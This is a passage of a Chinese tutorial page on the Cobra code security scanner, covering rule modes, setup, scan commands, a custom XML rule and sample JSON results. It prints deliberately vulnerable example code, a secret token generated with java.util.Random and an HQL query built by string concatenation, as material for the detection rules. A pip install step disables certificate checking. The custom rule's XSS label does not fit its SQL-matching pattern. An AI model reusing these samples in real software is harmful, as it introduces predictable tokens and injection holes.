+
+<div class="org-src-container">
+<pre class="src src-sh">Mode &#31867;&#22411; &#40664;&#35748;&#27169;&#24335; &#25903;&#25345;&#35821;&#35328; &#25551;&#36848;
+
+regex-only-match
+&#27491;&#21017;&#20165;&#21305;&#37197; &#26159; *
+&#40664;&#35748;&#26159;&#27492;&#27169;&#24335;&#65292;&#20294;&#38656;&#35201;&#26174;&#24335;&#30340;&#20889;&#22312;&#35268;&#21017;&#25991;&#20214;&#37324;&#12290;&#20197;&#27491;&#21017;&#30340;&#26041;&#24335;&#36827;&#34892;&#21305;&#37197;&#65292;&#21305;&#37197;&#21040;&#20869;&#23481;&#21017;&#31639;&#20316;&#28431;&#27934;
+
+regex-param-controllable
+&#27491;&#21017;&#21442;&#25968;&#21487;&#25511; &#21542; PHP/Java
+&#20197;&#27491;&#21017;&#27169;&#24335;&#36827;&#34892;&#21305;&#37197;&#65292;&#21305;&#37197;&#20986;&#30340;&#21464;&#37327;&#21487;&#22806;&#37096;&#25511;&#21046;&#21017;&#20026;&#28431;&#27934;
+
+function-param-controllable
+&#20989;&#25968;&#21442;&#25968;&#21487;&#25511; &#21542; PHP
+&#20869;&#23481;&#20889;&#20989;&#25968;&#21517;&#65292;&#23558;&#25628;&#32034;&#25152;&#26377;&#35813;&#20989;&#25968;&#30340;&#35843;&#29992;&#65292;&#33509;&#21442;&#25968;&#22806;&#37096;&#21487;&#25511;&#21017;&#20026;&#28431;&#27934;&#12290;
+
+find-extension
+&#23547;&#25214;&#25351;&#23450;&#21518;&#32512;&#25991;&#20214; &#21542; *
+&#25214;&#21040;&#25351;&#23450;&#21518;&#32512;&#25991;&#20214;&#21017;&#31639;&#20316;&#28431;&#27934;
+</pre>
+</div>
+
+<p>
+&lt;match2&gt; / &lt;repair&gt; Block（ &lt;match2&gt; / &lt;repair&gt; 的匹配区块）
+用来描述需要匹配的代码区块位置，只能用在 &lt;match2&gt; 或 &lt;repair&gt; 中。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#21306;&#22359; &#25551;&#36848;
+in-current-line &#30001;&#31532;&#19968;&#26465;&#35268;&#21017;&#35302;&#21457;&#30340;&#25152;&#22312;&#34892;
+in-function &#30001;&#31532;&#19968;&#26465;&#35268;&#21017;&#35302;&#21457;&#30340;&#20989;&#25968;&#20307;&#20869;
+in-function-up &#30001;&#31532;&#19968;&#26465;&#35268;&#21017;&#35302;&#21457;&#30340;&#25152;&#22312;&#34892;&#20043;&#19978;&#65292;&#25152;&#22312;&#20989;&#25968;&#20307;&#20043;&#20869;
+in-function-down &#30001;&#31532;&#19968;&#26465;&#35268;&#21017;&#35302;&#21457;&#30340;&#25152;&#22312;&#34892;&#20043;&#19979;&#65292;&#25152;&#22312;&#20989;&#25968;&#20307;&#20043;&#20869;
+in-file &#30001;&#31532;&#19968;&#26465;&#35268;&#21017;&#35302;&#21457;&#30340;&#25991;&#20214;&#20869;
+in-file-up &#30001;&#31532;&#19968;&#26465;&#35268;&#21017;&#35302;&#21457;&#30340;&#25152;&#22312;&#34892;&#20043;&#19978;&#65292;&#25152;&#22312;&#25991;&#20214;&#20043;&#20869;
+in-file-down &#30001;&#31532;&#19968;&#26465;&#35268;&#21017;&#35302;&#21457;&#30340;&#25152;&#22312;&#34892;&#20043;&#19979;&#65292;&#25152;&#22312;&#25991;&#20214;&#20043;&#20869;
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:72fc1a01-f259-4bda-9c97-cbf07f251d08" class="outline-3">
+<h3 id="h:72fc1a01-f259-4bda-9c97-cbf07f251d08">Example</h3>
+<div class="outline-text-3" id="text-h:72fc1a01-f259-4bda-9c97-cbf07f251d08">
+</div>
+<div id="outline-container-h:7b479a29-655d-4226-b968-70e1e9bf22ef" class="outline-4">
+<h4 id="h:7b479a29-655d-4226-b968-70e1e9bf22ef">使用测试代码进行扫描</h4>
+<div class="outline-text-4" id="text-h:7b479a29-655d-4226-b968-70e1e9bf22ef">
+<p>
+<b>Web服务模式</b>
+</p>
+
+<p>
+更改配置文件
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cp config.template config
+</pre>
+</div>
+
+<p>
+修改 secret_key 为自己的key值
+</p>
+
+<p>
+安装依赖
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">pip3 install -r requirements.txt
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>安装python3</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-sh">yum install python3
+
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23433;&#35013;pip</span>
+wget https://bootstrap.pypa.io/get-pip.py --no-check-certificate
+python3 get-pip.py
+</pre>
+</div>
+
+<p>
+使用以下命令启动Web服务
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">python3 cobra.py -H 0.0.0.0 -P 8888
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>扫描github上的代码</li>
+</ul>
+
+<p>
+直接输入git地址即可(亦可扫描公司内部的Gitlab服务上的代码)
+扫描完成后可以看到对应的扫描结果
+</p>
+
+<ul class="org-ul">
+<li>扫描本地代码</li>
+</ul>
+
+<p>
+使用文件上传的方式扫描本地代码(需将代码文件打包成压缩包进行上传)
+</p>
+
+<ul class="org-ul">
+<li>使用web接口下发任务</li>
+</ul>
+
+<p>
+使用postman下发任务
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">// &#35831;&#27714;&#20307;
+{
+    <span style="color: #8b2252;">"key"</span>: <span style="color: #8b2252;">"cici_key"</span>,
+    <span style="color: #8b2252;">"target"</span>: <span style="color: #8b2252;">"https://github.com/FeeiCN/dict.git:master"</span>,
+    <span style="color: #8b2252;">"rule"</span>: <span style="color: #8b2252;">"cvi-130003"</span>
+}
+// &#21709;&#24212;
+{
+    <span style="color: #8b2252;">"code"</span>: 1001,
+    <span style="color: #8b2252;">"result"</span>: {
+        <span style="color: #8b2252;">"msg"</span>: <span style="color: #8b2252;">"Add scan job successfully."</span>,
+        <span style="color: #8b2252;">"sid"</span>: <span style="color: #8b2252;">"ab9149nhvcal"</span>,
+        <span style="color: #8b2252;">"total_target_num"</span>: 1
+    }
+}
+</pre>
+</div>
+
+<p>
+查询任务状态
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">{
+<span style="color: #8b2252;">"key"</span>: <span style="color: #8b2252;">"cici_key"</span>,
+<span style="color: #8b2252;">"sid"</span>: <span style="color: #8b2252;">"ab9149nhvcal"</span>
+}
+</pre>
+</div>
+
+<p>
+<b>CLI模式</b>
+</p>
+
+<p>
+命令：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#25991;&#20214;</span>
+python3 cobra.py -t tests/vulnerabilities/v.java
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#30446;&#24405;</span>
+python3 cobra.py -t tests/vulnerabilities
+</pre>
+</div>
+
+<p>
+使用全量规则对java文件进行扫描
+</p>
+
+<p>
+使用 -f 与 -o 选项输出扫描结果
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">python3 cobra.py -t tests/vulnerabilities -f json -o /tmp/report2.json
+<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992; -r &#21487;&#25351;&#23450;&#35268;&#21017;</span>
+python3 cobra.py -t tests/vulnerabilities -r cvi-190001,cvi-190002
+</pre>
+</div>
+
+<p>
+可以看到 json 格式的输出结果
+</p>
+</div>
+</div>
+<div id="outline-container-h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427" class="outline-4">
+<h4 id="h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427">自定义规则</h4>
+<div class="outline-text-4" id="text-h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427">
+<p>
+先复制出一个规则模版
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">cp CVI-140002.xml CVI-1400022.xml
+</pre>
+</div>
+
+<p>
+CVI-1400022.xml 规则文件
+使用正则表达式匹配 select from 语句中有 + 拼接的行
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span style="color: #000000; background-color: #ffffff;">&lt;?</span><span style="color: #a020f0;">xml</span> <span style="color: #8b2252;">version="1.0" encoding="UTF-8"</span><span style="color: #000000; background-color: #ffffff;">?&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">cobra</span> <span style="color: #a0522d;">document</span>=<span style="color: #8b2252;">"https://github.com/WhaleShark-Team/cobra"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">name</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"&#36755;&#20986;&#20837;&#21442;&#21487;&#33021;&#23548;&#33268;XSS"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">language</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"java"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">match</span> <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"regex-only-match"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">select.*from.*\+.*</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">match</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">level</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"4"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">solution</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">    ## &#23433;&#20840;&#39118;&#38505;</span>
+<span style="color: #000000; background-color: #ffffff;">    &#26597;&#25214;select sql &#35821;&#21477;</span>
+<span style="color: #000000; background-color: #ffffff;">    ## &#20462;&#22797;&#26041;&#26696;</span>
+<span style="color: #000000; background-color: #ffffff;">    &#21442;&#25968;&#21270;&#26597;&#35810;</span>
+<span style="color: #000000; background-color: #ffffff;">  </span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">solution</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">test</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+    <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">case</span> <span style="color: #a0522d;">assert</span>=<span style="color: #8b2252;">"true"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">select user from users where id = 1</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">case</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">test</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">status</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"on"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">author</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"Cici"</span> <span style="color: #a0522d;">email</span>=<span style="color: #8b2252;">"cici@cici.cn"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">cobra</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+</pre>
+</div>
+
+<p>
+<a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式教程</a>
+</p>
+
+<p>
+<b>扫描结果</b>
+</p>
+
+<p>
+json文件
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">{
+    <span style="color: #8b2252;">"s6e97fel57zb"</span>:{
+        <span style="color: #8b2252;">"extension"</span>:1,
+        <span style="color: #8b2252;">"file"</span>:1,
+        <span style="color: #8b2252;">"framework"</span>:<span style="color: #8b2252;">"Unknown Framework"</span>,
+        <span style="color: #8b2252;">"language"</span>:<span style="color: #8b2252;">"java"</span>,
+        <span style="color: #8b2252;">"push_rules"</span>:1,
+        <span style="color: #8b2252;">"target_directory"</span>:<span style="color: #8b2252;">"/root/cobra/tests/vulnerabilities"</span>,
+        <span style="color: #8b2252;">"trigger_rules"</span>:1,
+        <span style="color: #8b2252;">"vulnerabilities"</span>:[
+            {
+                <span style="color: #8b2252;">"analysis"</span>:<span style="color: #8b2252;">"REGEX-ONLY-MATCH(&#27491;&#21017;&#20165;&#21305;&#37197;+&#26080;&#20462;&#22797;&#35268;&#21017;)"</span>,
+                <span style="color: #8b2252;">"code_content"</span>:<span style="color: #8b2252;">"String hql = \"select max(detailLineNo) from TWmsSoreturnAsnDetailEntity where isDel = 0 and asnId=\"+headId;"</span>,
+                <span style="color: #8b2252;">"commit_author"</span>:<span style="color: #8b2252;">"Unknown"</span>,
+                <span style="color: #8b2252;">"commit_time"</span>:<span style="color: #8b2252;">"Unknown"</span>,
+                <span style="color: #8b2252;">"file_path"</span>:<span style="color: #8b2252;">"/v.java"</span>,
+                <span style="color: #8b2252;">"id"</span>:<span style="color: #8b2252;">"140002"</span>,
+                <span style="color: #8b2252;">"language"</span>:<span style="color: #8b2252;">"java"</span>,
+                <span style="color: #8b2252;">"level"</span>:<span style="color: #8b2252;">"4"</span>,
+                <span style="color: #8b2252;">"line_number"</span>:<span style="color: #8b2252;">"49"</span>,
+                <span style="color: #8b2252;">"match_result"</span>:null,
+                <span style="color: #8b2252;">"rule_name"</span>:<span style="color: #8b2252;">"&#36755;&#20986;&#20837;&#21442;&#21487;&#33021;&#23548;&#33268;XSS"</span>,
+                <span style="color: #8b2252;">"solution"</span>:<span style="color: #8b2252;">"## &#23433;&#20840;&#39118;&#38505;\n &#36755;&#20986;&#20837;&#21442;&#20250;&#23548;&#33268;XSS\n\n ## &#20462;&#22797;&#26041;&#26696;\n&#20351;&#29992;Begis&#23545;&#21442;&#25968;&#36827;&#34892;&#36807;&#28388;&#21518;&#20877;&#36755;&#20986;"</span>
+            }
+        ],
+        <span style="color: #8b2252;">"target"</span>:<span style="color: #8b2252;">"tests/vulnerabilities/v.java"</span>
+    }
+}
+</pre>
+</div>
+
+<p>
+<b>多匹配条件规则分析</b>
+</p>
+
+<p>
+查看CVI-200001.xml 规则文件
+</p>
+<div class="org-src-container">
+<pre class="src src-xml"><span style="color: #000000; background-color: #ffffff;">&lt;?</span><span style="color: #a020f0;">xml</span> <span style="color: #8b2252;">version="1.0" encoding="UTF-8"</span><span style="color: #000000; background-color: #ffffff;">?&gt;</span>
+<span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">cobra</span> <span style="color: #a0522d;">document</span>=<span style="color: #8b2252;">"https://github.com/WhaleShark-Team/cobra"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">name</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"&#19981;&#23433;&#20840;&#30340;&#38543;&#26426;&#25968;"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">language</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"java"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">match</span> <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"regex-only-match"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">new Random\s*\(|Random\.next</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">match</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">match2</span> <span style="color: #a0522d;">block</span>=<span style="color: #8b2252;">"in-file-up"</span><span style="color: #000000; background-color: #ffffff;">&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;![</span><span style="color: #483d8b;">CDATA</span><span style="color: #000000; background-color: #ffffff;">[</span><span style="color: #000000; background-color: #ffffff;">((java|scala)\.util\.Random)</span><span style="color: #000000; background-color: #ffffff;">]]&gt;</span><span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #0000ff;">match2</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+  <span style="color: #000000; background-color: #ffffff;">&lt;</span><span style="color: #0000ff;">level</span> <span style="color: #a0522d;">value</span>=<span style="color: #8b2252;">"2"</span><span style="color: #000000; background-color: #ffffff;">/</span><span style="color: #000000; background-color: #ffffff;">&gt;</span>
+</pre>
+</div>
+
+<p>
+查看第一条规则,使用 match 标签， mode 为 regex-only-match ，意为使用正则匹配
+&lt;match mode="regex-only-match"&gt;&lt;![CDATA[new Random\s*\(|Random\.next]]&gt;&lt;/match&gt;
+</p>
+
+<p>
+查看第二条规则 match2 ， block 为 in-file-up ,意为第二条规则匹配第一条规则所在文件行以上的内容
+</p>
+
+<p>
+可匹配的Java代码为
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">import</span> <span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">util</span>.<span style="color: #228b22;">Random</span>;
+
+<span style="color: #b22222;">// </span><span style="color: #b22222;">CVI-200001</span>
+<span style="color: #228b22;">String</span> <span style="color: #0000ff;">generateSecretToken</span>() {
+    <span style="color: #228b22;">Random</span> <span style="color: #a0522d;">r</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Random</span>();
+    <span style="color: #a020f0;">return</span> Long.toHexString(r.nextLong());
+}
+</pre>
+</div>
+</div>
+</div>
+</div>
+</section>
+</div>
+<div id="postamble" class="status">
+    <div class=bar data-astro-cid-p3givckg>
+        <div class=list data-astro-cid-p3givckg>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:gnuemacs height=1em viewBox="0 0 24 24" width=1em>
+                    <title>emacs</title>
+                    <symbol id=ai:simple-icons:gnuemacs>
+                        <path d="M12 24C5.448 24 .118 18.617.118 12S5.448 0 12 0s11.882 5.383 11.882 12S18.552 24 12 24zM12 .661C5.813.661.779 5.748.779 12S5.813 23.339 12 23.339S23.221 18.253 23.221 12S18.187.661 12 .661zM8.03 20.197s.978.069 2.236-.042c.51-.045 2.444-.235 3.891-.552c0 0 1.764-.377 2.707-.725c.987-.364 1.524-.673 1.766-1.11c-.011-.09.074-.408-.381-.599c-1.164-.488-2.514-.4-5.185-.457c-2.962-.102-3.948-.598-4.472-.997c-.503-.405-.25-1.526 1.907-2.513c1.086-.526 5.345-1.496 5.345-1.496c-1.434-.709-4.109-1.955-4.659-2.224c-.482-.236-1.254-.591-1.421-1.021c-.19-.413.448-.768.804-.87c1.147-.331 2.766-.536 4.24-.56c.741-.012.861-.059.861-.059c1.022-.17 1.695-.869 1.414-1.976c-.252-1.13-1.579-1.795-2.84-1.565c-1.188.217-4.05 1.048-4.05 1.048c3.539-.031 4.131.028 4.395.398c.156.218-.071.518-1.015.672c-1.027.168-3.163.37-3.163.37c-2.049.122-3.492.13-3.925 1.046c-.283.599.302 1.129.558 1.46c1.082 1.204 2.646 1.853 3.652 2.331c.379.18 1.49.52 1.49.52c-3.265-.18-5.619.823-7.001 1.977c-1.562 1.445-.871 3.168 2.33 4.228c1.891.626 2.828.921 5.648.667c1.661-.09 1.923-.036 1.939.1c.023.192-1.845.669-2.355.816c-1.298.374-4.699 1.129-4.716 1.133z" fill=currentColor/>
+                    </symbol>
+                    <use xlink:href=#ai:simple-icons:gnuemacs></use>
+                </svg>
+                <div class="content left" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>Emacs</p>
+                </div>
+            </span>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:org height=1em viewBox="0 0 24 24" width=1em>
+                    <title>org-mode</title>
+                    <symbol id=ai:simple-icons:org>
+                        <path d="M17.169 0c-.566.004-2.16 3.312-3.376 5.94a2.19 2.19 0 0 1-.408-1.267c-.03-.582-1.089.237-.936 1.275c-.068-.035-1.26.227-1.26.23c-.23-.93-.802-1.618-1.15-.563c-.701 1.663-.88 2.984.115 4.585c-.908 4.058-6.948 6.053-6.32 9.33c.175.004 1.634 3.48 6.337 2.057c5.557-1.577 8.624 2.116 8.978 2.375c.52.526-1.348-4.573-5.302-6.865c-2.339-1.276-.87-3.474-.703-4.25c0 0 1.874 1.312 3.232-.692c1.227.316 2.05-.224 3.105.158c.64.28 3.336.11 2.334-1.396c-.148.129.07.27-.075.46c-.043.056-.128.232-.408.315c-.314.149-.83.27-1.43-.37c-.434-.32-.748-.04-.992-.063c.152-.098.577-.315 1.264-.315c.388 0 .594.336.854.338c.174 0 .685-.262.787-.365c.63-.41.697-.278 1.012-.905c.17-.759-.215-.92-.332-1.129c-.032-.483-.436-.67-.919-.326c-1.106-.198-2.192-.105-2.728-.15c-1.175-.164-2.153-.786-2.153-.786c.143-.19.075-.6-.842-.628c-.315-.104-.45-.2-.745-.307c.61-1.37.674-2.007 1.418-4.004c.261-1.053 1.039-2.685.643-2.682zm-4.297 8.093c.03-.086.443.138.952.176c.395.03.805.048 1.296-.025c.03-.005.172.095-.15.194c-.02.01-.062-.01-.065.196c0 .022-.01.04-.02.046c-.15.152-.708.223-1.065.1c-.436-.17-.482-.316-.517-.443c-.305-.147-.47-.123-.43-.244zM9.685 10.2C8.86 9 8.929 8.36 8.96 7.256C7.961 8.288 6.855 8.3 5.18 8.58c-1.299.234-3.657 2.447-4.025 4.742c-.043.608-.08 2.183.424 3.498c.492 1.13.828 1.727 1.844 2.335c-.882-3.169 5.296-5.33 6.263-8.955z" fill=currentColor/>
+                    </symbol>
+                    <use xlink:href=#ai:simple-icons:org></use>
+                </svg>
+                <div class="content left" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>Orgmode</p>
+                </div>
+            </span>
+            <a href=/donations.html class=entry data-astro-cid-p3givckg>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg class=heading data-astro-cid-p3givckg data-icon=simple-icons:astro height=1em viewBox="0 0 24 24" width=1em>
+                    <title>Donations</title>
+                    <symbol id=ai:simple-icons:astro>
+                        <path d="M8.358 20.162c-1.186-1.07-1.532-3.316-1.038-4.944c.856 1.026 2.043 1.352 3.272 1.535c1.897.283 3.76.177 5.522-.678c.202-.098.388-.229.608-.36c.166.473.209.95.151 1.437c-.14 1.185-.738 2.1-1.688 2.794c-.38.277-.782.525-1.175.787c-1.205.804-1.531 1.747-1.078 3.119l.044.148a3.158 3.158 0 0 1-1.407-1.188a3.31 3.31 0 0 1-.544-1.815c-.004-.32-.004-.642-.048-.958c-.106-.769-.472-1.113-1.161-1.133c-.707-.02-1.267.411-1.415 1.09c-.012.053-.028.104-.045.165h.002zm-5.961-4.445s3.24-1.575 6.49-1.575l2.451-7.565c.092-.366.36-.614.662-.614c.302 0 .57.248.662.614l2.45 7.565c3.85 0 6.491 1.575 6.491 1.575L16.088.727C15.93.285 15.663 0 15.303 0H8.697c-.36 0-.615.285-.784.727l-5.516 14.99z" fill=currentColor/>
+                    </symbol>
+                    <use xlink:href=#ai:simple-icons:astro></use>
+                </svg>
+                <div class="content left" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>打赏</p>
+                </div>
+            </span>
+            </a>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg xmlns="http://www.w3.org/2000/svg" class=heading data-astro-cid-p3givckg data-icon=simple-icons:copyright width="1em" height="1em" viewBox="0 0 24 24">
+                    <title>Copyright</title>
+                    <path fill="currentColor" d="M19 2a3 3 0 0 1 3 3v14a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zm-5 5h-4a1 1 0 0 0-1 1l.007.117A1 1 0 0 0 10 9h3v5a1 1 0 0 1-1.993.117L11 14a1 1 0 0 0-2 0a3 3 0 0 0 6 0V8a1 1 0 0 0-1-1" />
+                    <use xlink:href=#ai:simple-icons:copyright></use>
+                </svg>
+                <div class="content left" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>© 2025 Jasper Hsu</p>
+                </div>
+            </span>
+        </div>
+        <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="list license" data-astro-cid-p3givckg>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em>
+                    <title>Creative Commons</title>
+                    <symbol id=ai:fa6-brands:creative-commons>
+                        <path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86zm143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86zM247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248zm.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82z" fill=currentColor/>
+                    </symbol>
+                    <use xlink:href=#ai:fa6-brands:creative-commons></use>
+                </svg>
+                <div class="content right" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>Creative Commons</p>
+                </div>
+            </span>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-by height=1em viewBox="0 0 496 512" width=0.97em>
+                    <title>Attribute</title>
+                    <symbol id=ai:fa6-brands:creative-commons-by>
+                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
+                    </symbol>
+                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
+                </svg>
+                <div class="content right" data-astro-cid-p3givckg>
+                    <p data-astro-cid-p3givckg>Attribute</p>
+                </div>
+            </span>
+            <span class=entry data-astro-cid-p3givckg>
+                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
+                    <title>Noncommercial</title>
+                    <symbol id=ai:fa6-brands:creative-commons-nc>
